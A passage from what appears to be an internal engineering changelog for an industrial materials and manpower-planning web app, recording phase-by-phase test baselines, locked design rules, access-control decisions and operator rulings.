>   box. Pre-printing deletes the hardest half of `ai/handwritten.py` — the
>   18-entry corrections table, the fuzzy matcher, the candidate picker all
>   exist to recover from misread names. The QR deletes the other half: site,
>   system, sub-activity and sheet identity come off a DECODER, not a model.
>   Do not "improve" the form by letting people write material names on it.
>
> * ⚠️ **EVERY DOWNLOAD REGISTERS A NEW `Form_UUID`. THIS IS NOT A CACHING
>   BUG.** Two prints are two physical sheets, and 9d must distinguish a
>   RE-PRINT from a RE-PHOTOGRAPH. One identity for both makes duplicate
>   detection unimplementable. `GET /execution/forms/{code}` is therefore a GET
>   that WRITES, and the UI says so in words.
>
> * ⚠️ **ROW ORDER IS A DATA CONTRACT, AND `Recipe_Fingerprint` PINS IT.**
>   The QR cannot carry a material list, so 9d maps handwriting POSITIONALLY:
>   row 3 on the paper is row 3 of the fingerprint. `recipe_rows()` sorts by
>   (sub-activity, material, SAP) — all three, because seven (system, material)
>   pairs in the live recipe have more than one row. The hash covers the ORDER;
>   a reorder that a same-set check would miss mis-files every quantity by one.
>   It deliberately EXCLUDES `For_1_SQM`: a rate cannot mis-map anything, and
>   invalidating printed paper for it is its own failure.
>
> * ⚠️ **FOUR ROWS CAN SHARE ONE MATERIAL NAME.** LSC8 prints
>   `GI-8005765` ("Cumicrete PU MF 300 - 3mm") four times, separated only by
>   `Material_Description` — Comp-A/B/C/D. `_row_label` appends the description
>   ONLY where the code appears more than once in that form. Printed by name
>   alone the supervisor gets four identical boxes, on seven of eleven systems.
>
> ⚠️ **`/execution/forms`, NOT `/mh/...`.** The operator's brief said
> `/mh/execution/forms`; Man-Hours is exact-locked to {hod, admin} and the
> supervisor is the person who carries this paper. `/execution` already belongs
> to exactly the three roles the ruling names (SK, supervisor, HOD).
>
> ⚠️ **fpdf's core fonts are latin-1, and `reports._latin` DROPS what it cannot
> encode.** `consumption_form._txt` transliterates first (— → -, · → *, ² → 2).
> Without it "Cumifloor ECO Primer — Primer - Comp-A" silently loses the one
> character separating the material from the component that distinguishes it.
> The truncation ellipsis is "..." for the same reason: it is appended AFTER
> transliteration.
>
> ⚠️ **CM-15 decodes the QR out of the RENDERED PAGE** (cv2 + pypdfium2), not
> out of the string that built it. Neither library is in `requirements.txt`, so
> the check degrades to a loud SKIP rather than failing — it never claims to
> have verified the print when it only compared two strings.

> **Updated 2026-08-25 — Phase 9 slices 9a + 9b (`feat/phase9-wbs-and-math`).**
> Baselines move to **service tests 1,925** (+57: suite CK 42, suite CL 13,
> CI-33b/c) and **E2E 111** (+4). Legacy 599, UI math 33, nav **49** (+1 route),
> alembic head **`e3a7d9b21f64`** (one additive table, no backfill).
> ⚠️ `tools/parity_check.py` is RED and was red before this branch — byte
> identical on a stashed tree. It is sqlite/Postgres data drift in
> `sme_materials_view`, not code.
>
> **Five additions to the LOCKED set:**
>
> * **THE WBS COLUMN WAS BLANK BECAUSE A SCREEN WAS MISSING, NOT A FEATURE.**
>   `wbs_master`, `entry_docs.assert_wbs()` and `GET/POST/PATCH
>   /hod/site-config/wbs` shipped with the parity build and NOTHING in
>   `frontend/src/` ever called them. Both WBS rules are CONDITIONAL — they do
>   nothing until a site has active rows — so with zero rows the gate was a
>   permanent no-op, no entry was ever asked for a WBS, and all 1,674 live
>   consumption rows carry none. `/hod/wbs` is the tap. Before adding a
>   "missing" rule to this system, check whether it is already there with no
>   way to reach it.
>
> * ⚠️ **`resolve_wbs` RUNS BEFORE `assert_wbs`, AND THE ORDER IS THE
>   FEATURE.** The resolver exists to fill in a WBS the form left blank; the
>   gate refuses a blank. Run gate-first — which is what the router did — every
>   issue at a WBS-enabled site is rejected for want of the number the map was
>   about to supply, and the work-type map is unreachable. The gate for an
>   ISSUE therefore lives inside `stage_consumption`, after resolution, and
>   asserts the RESOLVED value. Receipts still assert in the router: they have
>   no work type to resolve from. CK-26 is the pin.
>
> * **`Work_Type_Norm` IS THE IDENTITY; `Work_Type` IS ONLY THE SPELLING.** The
>   live ledger holds 35 distinct `Work_Type` strings, four pairs of which
>   differ from another only in case (`civil`/`Civil`, `coating`/`Coating`,
>   `In yard`/`In Yard`, `others`/`Others`). Normalisation is lower + trim +
>   collapse-whitespace and merges EXACTLY those; `Arrangement` vs `Site
>   Arrangement` stays two work types, because merging those is a judgement
>   about the work and belongs to the HOD in the UI. Nothing is seeded by
>   migration — seeding would have enshrined both spellings as blessed options;
>   `/hod/site-config/work-types/suggestions` offers them merged and counted
>   instead.
>
> * ⚠️ **`SUPERVISOR_REQUEST` AND `STOCK_ADJUSTMENT` ARE NOT WORK TYPES.**
>   They are markers the app writes itself (`supervisor.approve_smr`,
>   `ledger.stage_adjustment`) and `reports.rep_intent_vs_actual` joins on the
>   first. They can never be added to the list, never mapped to a WBS, and
>   never refused by the strict-dropdown gate — a gate that blocked them would
>   break stock adjustments, a long way from where anyone would look.
>
> * **NIGHTS BUY TIME, NOT A SMALLER PAYROLL (ruling Q10, 2026-08-25).** The
>   total headcount is still `manhours / (days x 11)` whatever the shift count,
>   because a person works one shift a day — that half of the old model
>   survives. What running nights buys is CALENDAR TIME:
>   `Days_Day_Shift_Only`, `Days_Both_Shifts`, `Days_Saved_By_Nights`. A
>   planner that showed only the unchanged headcount read as though nights
>   bought nothing.
>
> ⚠️ **AND THE PER-SHIFT SPLIT COMES FROM THE ROSTER, NEVER FROM
> `/ shifts_per_day`.** This operator runs a day shift of 20 against a night
> shift of 80; an even split understates the night crew FOURFOLD. One helper —
> `planner.shift_split` — serves `plan_many` AND `session_plan`, and
> `Shift_Split_Basis` names which basis was available (`roster` · `site` ·
> `assumed_even` · `day_only`). Only the middle two are assumptions and both
> say so. A roster with day workers and NO night workers is NOT a valid basis:
> it means there is no night crew yet, and read as a proportion it would put
> 100% of a forced two-shift plan on days and make the option do nothing.
>
> ⚠️ **CAPACITY IS THE ROLES THE JOB NEEDS, NOT THE PAYROLL.**
> `days_with_roster` always filtered to `role_manhours`; `normal_capacity` and
> `ot_capacity` did not, so an idle blaster inflated capacity, understating both
> the overtime and the hire-to-clear advice — the two numbers an HOD acts on.
> Same filter now, with the payroll still published beside it as
> `roster.Capacity_GI` / `Capacity_NON_GI`.
>
> ⚠️ **`tests/e2e/specs/wbs-work-types.spec.ts` RUNS IN ITS OWN PROJECT,
> LAST.** Adding the first WBS number switches `assert_wbs` on for that site,
> and a scoped HOD can only manage their OWN site — the one every other spec
> posts to. Run inside the parallel pack it flipped the gate mid-flight and
> 422'd whichever spec happened to be posting, surfacing as a DIFFERENT failure
> each run (three runs, three different specs). Same hazard as `entry-docs`,
> same remedy. Do not fold it back into `chromium`.

> **Updated 2026-08-24 — Phase 8 slice 8f (`feat/phase8-docs-ai`). PHASE 8
> COMPLETE.** Baselines move to **service tests 1,868** (+43, suite CJ);
> E2E 107, legacy 599, parity 1,313, UI math 33, nav 48 and alembic head
> **`c7e1a4b92d63`** unchanged — this slice adds no table and no route.
>
> **Four additions to the LOCKED set:**
>
> * **THERE IS ONE MANUAL, AND IT LIVES AT THE REPO ROOT.**
>   `docs/USER_MANUAL.md` was a second, role-based manual written 2026-07-26;
>   it was never updated, so it described a system four phases old while the
>   root manual — the AI corpus, parsed at runtime by `ai/manual_qa.py` — moved
>   on. Two manuals means one of them is wrong and nobody knows which. Deleted
>   (ruling Q10), and `tools/export_docs_pdf.py` now builds BOTH the ops PDF
>   (`docs/export/`) and **the copy the app serves** (`GI_Hub_User_Manual.pdf`,
>   read by `documents.reference_doc`) from it in one command — those were two
>   pipelines, and the in-app manual had drifted eleven days behind.
>
> * **THE ASSISTANT'S BAD ANSWERS WERE THE CORPUS, NOT THE PIPELINE.** Measured
>   before changing anything (ruling Q11): the index costs **2 ms to chunk +
>   15 ms to build** over the 229 KB manual and **0.3 ms per search**. That is
>   not what anybody feels — token generation is. What was actually wrong:
>   §19 documented FIVE Man-Hours tabs against a page with eleven; the access
>   matrix was in NO non-admin prompt; and "PR" retrieved nothing because the
>   manual spells it "purchase requisition". Warming the index in the lifespan
>   is hygiene (17 ms off the event loop, and a broken manual announces itself
>   at boot) — never claim it as the speed fix.
>
> * **A CAPTION AND ITS TABLE ARE ONE PASSAGE.** Putting the exact-role-lock
>   caveat and the access matrix under one `##` was NOT enough — §2.2 is
>   ~3,000 characters and `chunk_chapter`'s size wrap split them anyway,
>   producing a chunk that says "these pages are locked to their own role" with
>   no table to name that role. That pair is the whole mechanism behind "an HOD
>   cannot open the Manpower portal". A markdown table now adheres to the
>   paragraph above it (`_CAPTION_MAX_CHARS`), and the fallback path truncates
>   on `##` boundaries rather than at a character count — half a table reads as
>   a whole one.
>
> * **SECTION 2 IS NEVER TRUNCATED, FOR ANY ROLE.** `_PER_SECTION_CHAR_CAP`
>   went 800 -> 3,000 and section 2 is exempt entirely (`_NEVER_TRUNCATE`). It
>   is the chapter that says what a role may do; 800 characters landed inside
>   the role-hierarchy table, ~1,100 short of where the matrix begins. It also
>   gained a `###` capability list per role — nine of them, one per
>   `ROLE_META` entry — because "what can I do" is a question people ask in
>   those words, and a `###` is what retrieval can return.
>
> ⚠️ **The alias map (`manual_index._ALIASES`) expands, never substitutes,
> and runs on documents AND queries** — so "PR" finds "purchase requisition"
> and vice versa. It cannot widen what a role reaches: `search()` filters by
> chapter BEFORE scoring, and suite CJ asserts that adversarially.
>
> ⚠️ **The doc-drift gate compares the manual to the CODE.** CJ-04 counts
> the tabs in `ManHoursPage.tsx` and requires section 19 to document that many.
> A test asserting "twelve" would pass forever and notice nothing when the page
> grows a thirteenth.

> **Updated 2026-08-24 — Phase 8 slice 8e (`feat/phase8-sme-mp-link`).**
> The two modules finally answer one question. Baselines move to **service
> tests 1,825** (+37, suite CI) and **E2E 107** (+6); alembic head
> **`c7e1a4b92d63`** UNCHANGED — this slice adds no table. Legacy 599, parity
> 1,313, UI math 33, nav 48 unchanged.
>
> **Four additions to the LOCKED set:**
>
> * **BLOCKED WORK CARRIES NO HEADCOUNT.** `SQM_Deficit` costed in man-hours is
>   the SIZE OF A DELAY, not a hiring requirement. `session_plan._column` returns
>   `None` for every headcount field on that column and states why in the cell;
>   the per-role gap (`To_Assign`) is likewise measured against **can-do**, never
>   the overall. A number printed there is a number somebody hires against, and
>   those people are idle when the material lands. Suite CI-06, CI-07, CI-13,
>   CI-14 and an E2E assertion on the wording all gate it.
>
> * **THE THREE COLUMNS ARE ONE NUMBER, SPLIT.** Because
>   `SQM_Achievable_Now + SQM_Deficit == Remaining_SQM` by definition, and
>   man-hours are LINEAR in area (each benchmark contributes
>   `share x manhours_per_sqm`, and the shares do not depend on how much area is
>   left), `can_do + blocked == overall` survives the multiplication. That is why
>   the module computes ONE man-hours-per-m² per job and applies it three times
>   rather than costing three plans and hoping they reconcile. CI-04/05/10 gate
>   the identity; **CI-35 gates it against the OTHER planner** — `/mh/planner`
>   sums per activity, this multiplies a rate, and if they ever disagree neither
>   file says which is wrong.
>
> * **A CACHE ON A NUMBER PEOPLE DECIDE FROM MUST SAY IT IS A CACHE.** The
>   cascade is the heaviest read in the codebase and NOTHING about it depends on
>   the deadline, so the whole deadline-independent half — cascade, rollup,
>   benchmark selection, per-m² coefficients — is cached ~60 s per
>   (site, order, codes) and dragging Target Days re-runs only a division
>   (operator ruling Q8). Every response carries `cascade.cached` /
>   `age_seconds`, the page prints it, and `refresh=true` escapes it. **The
>   roster is deliberately NOT cached** — one cheap grouped query, and a stale
>   headcount is worse than a slow one (CI-32).
>
> * **UNMODELLED IS NOT BLOCKED.** `sme_engine._achievable` scores a unit with no
>   positive-rate recipe line at 0 (SME ruling Q5), which arrives in this report
>   as "100% blocked". The report says UNMODELLED instead, because one reading
>   sends somebody to chase procurement for a material nobody has named (CI-31).
>
> ⚠️ **The session travels in the URL, and nothing global was touched.**
> `ScenarioProvider` is mounted inside `SmePage`; `/manhours` is a different
> route. Lifting the provider to `App.tsx` for one button would have disturbed
> its per-user/per-site key logic, so the button navigates to
> `/manhours?tab=session&scenario=…&codes=…` using the SAME encoder
> (`sme/ScenarioContext.encodeTags` / `decodeTags`, exported in this slice) that
> writes `?scenario=` on the SME page. The E2E compares the two URLs
> byte-for-byte.
>
> ⚠️ **Surface prep is not in this report.** Blasting consumes no recipe line, so
> the material model has no opinion on whether it is blocked; putting it in would
> place hours in a column whose whole meaning is "material decides this".
>
> **Track 5 (KPI width)** shipped here too: `components/KpiRow.tsx` +
> `.gi-kpi-row` lay KPI cards out with flex rather than a 24-column slice, so N
> cards are N equal shares of the FULL width. Applied to Dashboard, Admin
> Console, Executive Summary, Manpower Planner (x3), Execution Report tabs (x2),
> Material Card, PPE Forecast, Employees, QC-HOD and the new report.
>
> ⚠️ **Known, pre-existing:** Labor Tracking now has TWELVE tabs and only about
> six fit at 1280px; the rest are reachable through antd's "…" overflow or by
> `?tab=`. E2E now navigates by URL rather than clicking those tabs
> (`tests/e2e/harness/ui.ts` explains why, including that the overflow items are
> `role="option"`, not `menuitem`).

> **Updated 2026-08-23 — Phase 8 slice 8d (`feat/phase8-qc-hod`).**
> The ninth role. Baselines move to **service tests 1,788** (+37, suite CH plus
> the qc_hod pass in BU), **E2E 101** (+5), alembic head **`c7e1a4b92d63`**,
> **nav 48**; legacy 599, parity 1,313, UI math 33 unchanged.
>
> **Four additions to the LOCKED set:**
>
> * **AN OVERSIGHT ROLE IS NOT ON THE LEVEL LADDER, AND A LEVEL CHECK REFUSES
>   IT.** `qc_hod` is level 2 with a named cross-site exemption
>   (`auth.QC_OVERSIGHT_ROLES`). Level 3 would have inherited 97
>   `require_level(0..3)` endpoints — but level 2 ALONE still admitted it to the
>   85 gated `require_level(<=2)`, the same trap one rung lower, and suite BU
>   caught it. `require_level` now refuses `QC_OVERSIGHT_ROLES` outright: the
>   level says what the role must NOT reach, and every actual grant is
>   enumerated with `require_roles`. Anything it genuinely needs (the site list,
>   the warehouse names) names the role explicitly.
>
> * **THE CATEGORY IS THE BOUNDARY OF THE ROLE.** Every read in
>   `services/qc_oversight.py` is filtered to the controlled category in SQL,
>   per function, never by a caller or a page. A cross-site account without that
>   filter is a company-wide window onto PPE, tools, consumables and every price
>   on every purchase order.
>
> * **READ-ONLY ALLOWLISTS ARE PER ROLE.** `readonly.py` no longer has one
>   shared list: `auditor` keeps its compute-only POSTs and streamed AI answers;
>   `qc_hod` gets three paths, all of which send a message. `/qc-hod/` is
>   deliberately NOT a bare prefix — that would open any future POST under it by
>   accident, which is the fail-open shape the whole module exists to avoid.
>
> * **A SITE-SCOPED NOTIFICATION CANNOT REACH AN UNSCOPED ROLE.** Visibility is
>   `recipient_site IS NULL OR recipient_site = site`, and a Head of Qualities
>   carries `site_id = ''` — so adding the role to `_MTC_ALERT_ROLES` would have
>   looked right and delivered nothing. `dispatch_missing_mtc` fires a SECOND,
>   unscoped, AGGREGATED message instead, which is the right shape for oversight
>   anyway: six messages saying one thing is how somebody responsible for six
>   sites learns to ignore them.
>
> ⚠️ **The role-registration checklist is now twelve files** and forgetting one
> fails quietly — the QSEP release added `qc` and forgot the AI manual map, so
> an inspector was answered out of the Store Keeper chapter for weeks. CH-25
> asserts every role in `ROLE_META` has chapters, a label and a refusal;
> `MANUAL_TESTING_GUIDE` §14k.7 lists the rest.

> **Updated 2026-08-22 — Phase 8 slice 8c (`feat/phase8-procurement-lock`).**
> Baselines move to **service tests 1,751** (+26, suite CG) and alembic head
> **`a9f2c6b40d18`**; E2E 96, legacy 599, parity 1,313, UI math 33, nav 47
> unchanged.
>
> **Four additions to the LOCKED set:**
>
> * **A PR NUMBER IS RESERVED, NOT GUESSED.** `pr_registry` is the table where
>   the number appears ONCE and can carry a primary key — `pr_master` cannot,
>   because a PR is many lines. `_next_pr_number` inserts and retries on
>   conflict, and it scans BOTH tables for the highest number: the registry
>   knows what is reserved (including a number whose lines are not written
>   yet), `pr_master` knows what exists (including rows an import wrote that
>   were never registered). `rename_pr` moves the reservation with the PR and
>   checks both tables for the collision.
>
> * **EVERY TRANSITION IS READ, ATTEMPTED, AND ASSERTED.** Read the state,
>   `UPDATE ... WHERE state = <expected>`, and treat `rowcount == 0` as an
>   ERROR. Both halves are needed — the read alone loses a race and the UPDATE
>   alone cannot say why it matched nothing. `submit_pr` used to accept lines
>   that were ALREADY submitted and fire a second notification to Logistics;
>   `create_po_from_pr` flipped the PR with an UPDATE whose rowcount nobody
>   read, so a second PO over the same lines matched zero rows and passed.
>
> * **THE PO LOCK IS PER LINE, NOT PER PR** (operator ruling Q7). A PR may
>   carry several POs — partial fulfilment splits one request across vendors or
>   deliveries — so `create_po_from_pr` takes `line_ids`; omitting them means
>   all submitted lines, which is what every earlier caller meant. **There is
>   deliberately no `uq_po_per_pr`**; it would make partial fulfilment
>   unrepresentable.
>
> * **A RETRY IS NOT A SECOND ORDER.** `Idempotency-Key` on the four dangerous
>   actions. The key is CLAIMED before the work and filled in after, so
>   concurrent duplicates serialise on the primary key; checking first and
>   writing later would leave the whole window open to the double-click it
>   exists to stop. Same key + same body replays; same key + DIFFERENT body is
>   409 (a client bug, not a retry); in-flight is 409, never a fabricated
>   answer. Keys are scoped by user AND action. On the client the key is minted
>   per FORM MOUNT and retired on success — per click it protects nothing, and
>   never rotating replays a genuinely new request.
>
> ⚠️ **Buttons are HIDDEN, not disabled**, once their state has moved on, and
> the Submit gate reads the DRAFT LINE COUNT rather than the aggregated
> `logistics_status` — that field is a lexicographic `MAX`, so a PR holding
> both draft and submitted lines reports `submitted` and would hide a button
> that still has work to do.

> **Updated 2026-08-21 — Phase 8 slice 8b (`feat/phase8-planner-ux`).**
> Many jobs, one deadline. Baselines move to **service tests 1,725** (+27,
> suite CF) and **E2E 96** (+6, `manpower-planner.spec.ts`); legacy 599,
> parity 1,313, UI math 33, nav 47 and alembic head `d4b8c1e63a27` unchanged —
> **this slice has no migration.**
>
> **Four additions to the LOCKED set:**
>
> * **A STACKED SURFACE IS PREPARED ONCE** (operator ruling Q13, closing the
>   open question 8a left). Two systems filed against an identical
>   `Lining_Area_Location` AND an identical area are one physical surface, and
>   the prep area counts it once — J027 is 4,555 m², not 5,059. The test is
>   EXACT match on both fields: partial overlaps exist in the master and no
>   arithmetic here can say how much of one lies inside another, so merging on
>   a partial match would silently drop real area. Where merged systems route
>   to different blasting variants the DEAREST is charged.
>
> * **TWO SHIFTS SPLIT THE CREW; THEY DO NOT ADD CAPACITY.** Nobody works both
>   a day and a night shift, so `Total_Required_Headcount = manhours / (days ×
>   11)` is independent of `shifts_per_day` and only `Headcount_Per_Shift`
>   halves. The natural reading — "two shifts, so half the people" — under-hires
>   by half, so the page states it in a banner and an E2E test fails if that
>   banner is removed. `target_days` and `deadline_hours` are the same quantity
>   (`hours = days × 11`); sending both is a 422, never a precedence rule.
>
> * **A SELECTION IS INTERSECTED WITH REALITY, NEVER MULTIPLIED.** Tags × codes
>   resolves against `sme_sqm_progress`, so 3 tags × 2 codes is 3 jobs and not
>   6; dropped combinations are named. An EMPTY code filter means EVERY code on
>   the selected tags — the filter's own placeholder says "all", and returning
>   nothing was a promise the UI made and the API broke. Surface prep is added
>   once per TAG, never per (tag, code).
>
> * **THE BACKEND ASSEMBLES THE JOB LABEL; THE FRONTEND RENDERS IT.**
>   `services/jobs.py` is the one assembler (operator ruling Q4) — a mirrored TS
>   formatter would be the third dual-implementation surface after the SME
>   engine and the sort key, and a label does not earn that machinery. The name
>   comes from `sme_recipe."Lining_System"`, the column the operator edits, NOT
>   from `Lining_System_Name` which holds the short code (`RLCB4`). Whitespace
>   is collapsed, because LSC3 ships two spellings of one name.
>
> ⚠️ **CV/ME IS A PROPERTY OF THE (TAG, CODE) ROW.** Already locked in 8a; 8b is
> where it reaches the UI. A row that IS one tag+code shows its exact discipline
> (`LSC1 [ME]`); an aggregate shows the set (`LSC1 [CV/ME]`). Never one Type
> picked from the first row met — that reads as fact and is wrong half the time.
> `frontend/src/sme/SystemCode.tsx` and `jobs.code_chip` both implement this;
> they are NOT a parity pair, since the backend owns every label that ships in a
> payload and the component only decorates rows the client already holds.

> **Updated 2026-08-20 — Phase 8 slice 8a (`feat/phase8-planner-math`).**
> The planner's arithmetic. Baselines move to **service tests 1,698** (+31,
> suite CE), alembic head **`d4b8c1e63a27`**; E2E 90, legacy 599, parity 1,313,
> UI math 33, nav 47 all unchanged.
>
> **Three additions to the LOCKED set:**
>
> * **SELECTION AND SUMMATION ARE DIFFERENT STEPS, AND THE PLANNER DOES BOTH,
>   IN THAT ORDER.** Benchmarks under DIFFERENT `Execution_Sub_Activity_Code`s
>   are sequential and their man-hours ADD; benchmarks under the SAME one are
>   alternatives and COMPETE. Adding the second kind is how surface prep came
>   to charge 3.6967 man-hours/m² where a concrete floor costs 0.1467 — 25×.
>   `services/planner.py` now gathers, then SELECTS (shares summing to 1), then
>   sums across distinct sub-activities only, and REPORTS every choice in
>   `benchmark_selection`. Where nothing in the data decides, it takes the
>   DEAREST candidate and flags `needs_operator` — **never the sum**.
>
> * **CV/ME IS A PROPERTY OF THE EQUIPMENT, NOT OF THE SYSTEM CODE.** `LSC1` is
>   CV on nine concrete rows and ME on nineteen tank/vessel rows in the live
>   master, so a chip reading `LSC1 [CV]` on any screen that aggregates across
>   equipment is false. `sme_equipment.Type` for that (tag, code) is what
>   resolves the twin benchmarks (LSC4, LSC5) — and it is what any future
>   CV/ME tag must read.
>
> * **A RENAME IN A WORKBOOK IS AN INSERT, NOT AN UPDATE.** `Activity`, `Type`
>   and `Variant_Key` are all part of `sme_manpower_norm`'s identity, so
>   renaming any of them creates a row and orphans the old one — and every
>   workbook row still matches, so the sync truthfully reports "0 rejections"
>   and mentions the leftover nowhere. `plan_sme_manpower_norms` now returns an
>   `orphans` list and `pg_excel_sync` prints it. **Reported, never deleted:** a
>   dry run that mutates is not a dry run, and an operator who imports a partial
>   sheet must not lose the rows it omits.
>
> ⚠️ **The planner's numbers move DOWNWARDS in this slice.** Any plan printed
> before 2026-08-20 overstates the labour required; do not reconcile a new one
> against an old printout.
>
> ⚠️ **OPEN — surfaces described twice are reported, not deduplicated.** J027
> files LSC1 and LSC2 at 504 m² each against an identical
> `Lining_Area_Location`: one surface, two systems, counted twice in the prep
> area. The plan publishes `gross_sqm` / `deduplicated_sqm` /
> `double_counted_sqm`, **uses the gross**, and warns. Whether such a surface is
> blasted once or twice is an operator ruling and has not been made.

> **Updated 2026-08-19 — the Phase 7 programme (branches `feat/phase7-*`).**
> Six merged slices: the LSC/ESC master-data migration, the manpower benchmark
> master, the roster extension, the execution workflow, variance reporting, and
> the planner. Baselines below move to **service tests 1,667 / E2E 90 /
> legacy 599 / parity 1,313 / nav 47**, alembic head `e5b2d7c94a16`.
>
> **Six additions to the LOCKED set:**
>
> * **Lining-system codes are STRINGS and sort NATURALLY.** `LSC2` before
>   `LSC10`. There is ONE implementation, `sme_engine.syscode_sort_key`;
>   `sme._syskey` and `sme_export_layouts._code_sort_key` delegate,
>   `engine.ts` mirrors it and `legacy/database.py` carries a documented copy.
>   This is not cosmetic — `allocate()` walks `codes_by_tag` in this order and
>   draws the pool down as it goes, so it decides which system gets scarce
>   material first.
>
> * **`Execution_Sub_Activity_Code` is part of the recipe identity**
>   (`Lining_System_Code, ESC, Material_Code, SAP_Code`). Adding it SPLIT a
>   number that was being summed: LSC2's Resin A is 0.2700 under ESC21 and
>   1.4674 under ESC22, and the old key merged them to 1.7374. A correct primer
>   draw measured against the merged figure reads as 15.5% of benchmark.
>
> * **`''` IS THE SENTINEL, NEVER NULL** — for `sme_recipe
>   .Execution_Sub_Activity_Code`, for `sme_execution_entry
>   .Lining_System_Code`, and for every key that follows. Postgres treats NULLs
>   as distinct, so a nullable column inside a key stops the key constraining,
>   and every `GROUP BY` over it grows an untyped bucket that renders as a
>   blank row.
>
> * **A migration carrying DML must expose `data_upgrade(conn)`.** The cutover
>   builds the schema from `models.py` and STAMPS alembic, so no migration ever
>   executes and every DATA step was being skipped — a box came up schema-right
>   and corrections-missing. `cutover_migrate.run_data_migrations` replays them,
>   and `verify_data_migration_contract` REFUSES in pre-flight when a migration
>   forgets. Both paths run the same code, so they cannot drift.
>
> * **`Worker_Type` is `GI | NON_GI`** (was `OWN | Supply` — both mapped;
>   `Supply` *is* the non-GI case). Overtime starts at a threshold that belongs
>   to the WORKER, not the shift: 11 worked hours split 8+3 for GI and 10+1 for
>   Non-GI. Thresholds live in `app_settings` and are the HOD's to set through
>   `/mh/settings`, deliberately not behind the admin gate.
>
> * **SURFACE PREP IS NOT LINING PROGRESS.** Blasting 100 m² of a tank is not
>   100 m² of lining done. Approval posts area to `sme_surface_prep_progress`
>   OR `sme_sqm_progress`, never both, decided by the entry's own stored system
>   code. `Done_SQM` drives Completion_Pct, SQM_Achievable_Now, the shortfall
>   and the buy list, so folding prep into it would report a vessel as
>   part-lined the moment it was cleaned.
>
> **Two things that look like bugs and are not:**
>
> * A **null variance is not a zero variance.** A missing benchmark renders
>   `n/a`, never a green 0% — "cannot compare" and "matched perfectly" must not
>   look the same.
> * **Report totals sum absolutes** and derive one percentage from the sums.
>   Averaging per-entry percentages weights a 2 m² entry like a 2,000 m² one,
>   which is how a programme 8% over reports itself as on target.
>
> **The planner (`/mh/planner`) mutates nothing** — advice, never an
> assignment. It derives man-hours per m² from `Manhours_Per_Shift ÷
> Standard_Productivity_Per_Shift`, NOT from the workbook's rounded
> `SQ. Mtr/Hr./Person` column, which overstates tile lining by 3.6%. It decides
> "system-agnostic" from DATA (no recipe line names the system), not from a
> `LIKE 'LSC%'` spelling convention. Unmatched roster designations are reported,
> never assumed absent.
>
> ⚠️ **Known data gap:** every active `mh_employees` row has a blank
> `Designation`, so the planner's "available" column reads 0 across every role
> until the roster is filled in. That is the warning working.


All green locally on **`main`**, verified **2026-08-04** at commit `2877888`
(PR #25 merged). These are the LOCKED baselines — a change that lowers any
of them is a regression, not a new normal.

> **Updated 2026-08-05** by the overnight asset/SME programme (branch
> `feat/overnight-asset-and-sme-upgrades`). Full account:
> [`OVERNIGHT_ASSET_TRACKING_RUNLOG.md`](OVERNIGHT_ASSET_TRACKING_RUNLOG.md).
> Three additions to the LOCKED set, all recorded there in full:
>
> * **Rule 1a extends to `sme_consumption_log`.** Observed Surface-Shield draw
>   is logged and displayed BESIDE the plan; it must never be netted off
>   `available_qty`. Suite BA now greps for that table by name too.
> * **`Tank No.` is resolved by an operator, never by a matcher.** `TNK-091`
>   suffix-matches TRAIN J *and* TRAIN K (39 rows). Ambiguous aliases park in
>   `sme_tank_alias`.
> * **THE APP WINS on SQM.** `sme_equipment.SQM_Override` survives the workbook
>   sync and `--sme-reseed`; the divergence is reported, never resolved silently.

> **Updated again 2026-08-05 (late)** by `feat/excel-location-sync-and-ui` (PR #30)
> and `chore/version-bump-and-docs-polish`. Full account:
> [`EXCEL_LOCATION_SYNC_RUNLOG.md`](EXCEL_LOCATION_SYNC_RUNLOG.md).
> Two additions to the LOCKED set:
>
> * **THE GOLDEN RULE — a `Location` on a Consumption Log row is what MAKES it a
>   reusable asset.** Blank means consumable, and no `asset_units` row is created.
>   Nothing else is consulted: not the category, not the SAP prefix, not whether a
>   serial is present. 1,165 of 1,166 real rows are blank, so a looser test would
>   manufacture a thousand phantom assets. A Location with **no serial** cannot be
>   keyed on `(Site_ID, SAP_Code, serial_no)` and is **reported back, never given
>   an invented serial** — one such row exists today (row 9, SAP 1169).
> * **THE WORKBOOK SEEDS, THE APP OWNS.** `storage_locations` upserts
>   `DO NOTHING`, a SAP with any existing rack assignment is skipped entirely, and
>   an existing `asset_units` row keeps its status, its rack and above all its
>   `current_lat`/`current_lng`. The single exception is guarded on
>   `last_seen_by = 'excel-sync'` **AND** both coordinates NULL — every app write
>   path stamps the real username, so the predicate is false the moment a human is
>   involved. Do not "simplify" this into an unconditional `DO UPDATE`.
>
> Also: the SME material NAME shown beside a code comes from `sme_recipe`, never
> `sme_inventory_seed`. Rule 1a makes the seed the sole source of every SME
> quantity; adding a label lookup into it is precisely how a quantity read arrives
> later. Suite BJ greps `sme_actuals.py` for the table object and fails if it
> reappears.

> **Updated 2026-08-06** by the security audit and its two fix branches
> (PR #32 `fix/formula-injection-and-csp`, PR #33
> `fix/sme-export-and-nginx-headers`). Full account:
> [`SECURITY_REVIEW_2026-08-05.md`](SECURITY_REVIEW_2026-08-05.md); forward
> roadmap in [`SECURITY_SUGGESTIONS.md`](SECURITY_SUGGESTIONS.md).
> One addition to the LOCKED set — **rule 12, above**: every export writer
> routes through `_defuse`, and `_defuse` never touches a number.
>
> The audit swept auth, RBAC, SQL construction, secrets, uploads, the AI lane
> and the frontend. **No High-severity findings. No SQL injection, no auth
> bypass, no XSS sink, no unsafe deserialization.** The one Medium finding —
> spreadsheet formula injection in report exports — is fixed and pinned by
> suite BK. A Content-Security-Policy now ships in `deploy/nginx.conf`, and the
> `location /assets/` block repeats the three security headers verbatim because
> nginx REPLACES rather than merges an inherited `add_header` set.

> **Updated 2026-08-09** by the **QSEP programme** (PRs #36, #37, #38) and the
> documentation pass that closed it. Operator rulings that constrain every one
> of those features, and that a fresh session will otherwise re-litigate:
>
> * **R1 — `employees.ID_Number` is the PERSON.** Unique company-wide, not per
>   site. PPE history follows it, which is why history survives a transfer
>   without any code that "moves" it.
> * **R2 (adjusted) — `inventory."Category" = 'PPE'` is valid for UI filtering,
>   but `ppe_rules` still governs per-item usable days.** With no rule, an item
>   has NO expiry and always demands a safety document.
> * **R3 (superseded 2026-08-12 by R3b) — material MAY travel to site
>   uninspected.** Do **not** block DN creation for want of an inspection. The
>   QC hard block applies only at SK issuance.
> * **R3b — the MTC gate MOVED to issuance (operator ruling, 2026-08-12).**
>   It used to be mandatory at warehouse goods-in and at DN creation. In live
>   use that was a hard workflow blocker: the truck is in the yard, the
>   certificate is in somebody's inbox, and refusing the receipt made real
